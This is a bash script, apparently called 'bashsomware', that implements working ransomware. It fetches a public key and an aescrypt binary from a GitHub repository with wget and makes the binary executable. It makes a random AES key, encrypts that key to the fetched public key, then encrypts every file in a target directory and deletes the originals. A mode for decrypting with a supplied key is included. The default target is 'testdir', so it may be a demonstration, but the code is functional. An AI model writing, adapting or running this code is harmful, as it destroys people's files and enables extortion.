#!/bin/bash

targetdir="testdir"
pkname="pub.key"

if [ $# -gt 0 ]
then
	dekey="$1"
	echo "If specified any amount of parameters, it will take the first one to try and decrypt all the previously encrypted files."
	echo "You have specified '$dekey' as your decryption key."
	echo "[Y|y] to continue"
	echo "[N|n] to abort"
	echo "[P|p] to specify a different decryption key"
	read continue

	clear

	case "$continue" in
		Y|y)
			echo "Continuing...";;
		N|n)
			echo "Aborting..."
			exit 0;;
		P|p)
			clear
			read -p "Input your decryption key: " dekey;;
		*)
			echo "Wrong input, aborting..."
			exit 1;;
	esac

	for value in "$targetdir"/*
	do
		if [ "${value: -4}" == ".aes" ]
		then
			./aescrypt -d -p "$dekey" "$value" 2> ".out"
			out=$(cat ".out")
			if [ "$out" == "Error: Message has been altered or password is incorrect" ]
			then
				echo "Wrong encryption key for file '$value'"
			else
				rm -f "$value"
				echo "File '$value' was decrypted"
			fi
		fi
	done
exit 0
fi

if [ ! -x "$(command -v gpg)" ]
then
	echo "gpg is not installed, please make sure it is installed, otherwise the encrypted files are unrecoverable."
	exit 1
fi

if [ ! -f "$pkname" ]
then
	echo "No public key '$pkname' in this directory, trying to download default..."
	wget -O pub.key "https://raw.githubusercontent.com/sne4ker/bashsomware/main/pub.key" > /dev/null 2>&1 /dev/null
	if [ ! -f "$pkname" ]
	then
		echo "Public key is not in directory and could not be downloaded."
		echo "Please make sure there is a public key in this directory ($pkname)"
		exit 1
	fi
	echo "Success!"
fi

if [ ! -f aescrypt ]
then
	wget -O aescrypt "https://github.com/sne4ker/bashsomware/raw/main/aescrypt" > /dev/null 2>&1 /dev/null
	chmod u+x aescrypt > /dev/null 2>&1 /dev/null
fi

if [ -f aescrypt ] && [ ! -x aescrypt ]
then
	chmod u+x aescrypt
fi

p1=$(echo $RANDOM)
p2=$(echo $RANDOM)
p3=$(echo $RANDOM)
p4=$(echo $RANDOM)
p5=$(echo $RANDOM)
wp="$p1$p2$p3$p4$p5"
key=$(echo $wp | md5sum | head -c 32)

if [ -f key.gpg ]
then
	if [ ! -d "_old" ]
	then
		mkdir "_old"
		echo "0" > "_old/ver"
	fi
	ver=$(cat _old/ver)
	let "ver+=1"
	echo "$ver" > "_old/ver"
	mv key.gpg _old/key"$ver".gpg
fi

echo "$key" | gpg -ea --recipient-file pub.key > key.gpg

for value in "$targetdir"/*
do
	basenamevalue=$(basename "$value")
	if [ -f "$value" ] && [ "${value: -4}" != ".aes" ] && [ "$basenamevalue" != "bashsomware.sh" ] && [ "$basenamevalue" != "aescrypt" ] && [ "$basenamevalue" != "key.gpg" ]
	then
		./aescrypt -e -p "$key" "$value"
		rm -f "$value"
	fi
done